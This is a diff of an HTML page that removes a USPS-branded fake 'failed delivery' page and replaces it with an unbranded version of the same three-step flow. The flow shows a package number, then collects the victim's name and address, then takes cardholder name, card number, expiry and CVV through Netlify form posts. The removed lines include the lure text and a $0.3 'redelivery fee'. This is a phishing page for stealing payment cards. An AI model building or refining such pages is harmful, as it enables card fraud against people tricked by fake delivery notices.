@@ -3,95 +3,66 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Package Status</title>
+  <title>Website Form</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-  <!-- Page 1: Delivery Status -->
+  <!-- Page 1 -->
   <div id="page1" class="container">
     <header>
-      <img src="usps-logo.png" alt="USPS Logo" class="logo">
+      <h2>Welcome to Page 1</h2>
     </header>
-    <h2>Delivery Status</h2>
-    <p>Your package number: <strong id="packageNumber"></strong></p>
-    <p class="error-message"><strong>Failure notice of delivery</strong></p>
-    <ul>
-      <li>Because the delivery address is not clear, your package has been put on hold for delivery.</li>
-      <li>Your package has returned to our operation center.</li>
-      <li>Please update your address. We will ship again in 2-4 business days.</li>
-    </ul>
+    <p>Your package number is <span id="packageNumber"></span>.</p>
     <button onclick="showPage(2)">Continue</button>
-    <footer>
-      <img src="usps-footer.png" alt="USPS Footer">
-    </footer>
   </div>
 
   <!-- Page 2: Mailing Address -->
   <div id="page2" class="container hidden">
     <header>
-      <img src="usps-logo.png" alt="USPS Logo" class="logo">
+      <h2>Mailing Address</h2>
     </header>
-    <h2>Mailing Address</h2>
-    <p>Dear users, please fill in the form carefully to ensure successful delivery.</p>
-    <form id="addressForm">
-      <label>Your Name <span class="required">*</span></label>
+    <form name="addressForm" method="POST" data-netlify="true" onsubmit="handleAddressSubmit(event)">
+      <input type="hidden" name="form-name" value="addressForm">
+      <label for="name">Name:</label>
       <input type="text" id="name" name="name" required>
 
-      <label>Address <span class="required">*</span></label>
+      <label for="address">Address:</label>
       <input type="text" id="address" name="address" required>
 
-      <label>Detailed Address (Optional)</label>
-      <input type="text" id="detailedAddress" name="detailedAddress">
-
-      <label>City <span class="required">*</span></label>
+      <label for="city">City:</label>
       <input type="text" id="city" name="city" required>
 
-      <label>State / Province / Region <span class="required">*</span></label>
+      <label for="state">State:</label>
       <input type="text" id="state" name="state" required>
 
-      <label>Postal Code <span class="required">*</span></label>
-      <input type="text" id="postalCode" name="postalCode" required>
+      <label for="zip">Postal Code:</label>
+      <input type="text" id="zip" name="zip" required>
 
-      <label>E-Mail <span class="required">*</span></label>
-      <input type="email" id="email" name="email" required>
-
-      <label>Telephone Number <span class="required">*</span></label>
-      <input type="text" id="telephone" name="telephone" required>
-
-      <button type="submit">Update Immediately</button>
+      <button type="submit">Submit Address</button>
     </form>
-    <footer>
-      <img src="usps-footer.png" alt="USPS Footer">
-    </footer>
   </div>
 
-  <!-- Page 3: Online Payment -->
+  <!-- Page 3: Payment -->
   <div id="page3" class="container hidden">
     <header>
-      <img src="usps-logo.png" alt="USPS Logo" class="logo">
+      <h2>Payment Information</h2>
     </header>
-    <h2>Online Payment</h2>
-    <p>For redelivery, we need to charge some service fees. Your package will be re-delivered after payment.</p>
-    <p><strong>Lump Sum: $0.3</strong></p>
-    <form id="paymentForm">
-      <label>Cardholder Name <span class="required">*</span></label>
+    <form name="paymentForm" method="POST" data-netlify="true" onsubmit="handlePaymentSubmit(event)">
+      <input type="hidden" name="form-name" value="paymentForm">
+      <label for="cardholder">Cardholder Name:</label>
       <input type="text" id="cardholder" name="cardholder" required>
 
-      <label>Card Number <span class="required">*</span></label>
+      <label for="cardNumber">Card Number:</label>
       <input type="text" id="cardNumber" name="cardNumber" required>
 
-      <label>Expiration Date <span class="required">*</span></label>
-      <input type="text" id="expireDate" name="expireDate" placeholder="MM/YY" required>
+      <label for="expiryDate">Expiry Date:</label>
+      <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
 
-      <label>Security Code (CVV) <span class="required">*</span></label>
+      <label for="cvv">CVV:</label>
       <input type="text" id="cvv" name="cvv" required>
 
-      <button type="submit">Submit</button>
+      <button type="submit">Submit Payment</button>
     </form>
-    <footer>
-      <img src="usps-footer.png" alt="USPS Footer">
-    </footer>
   </div>
 
   <script src="script.js"></script>
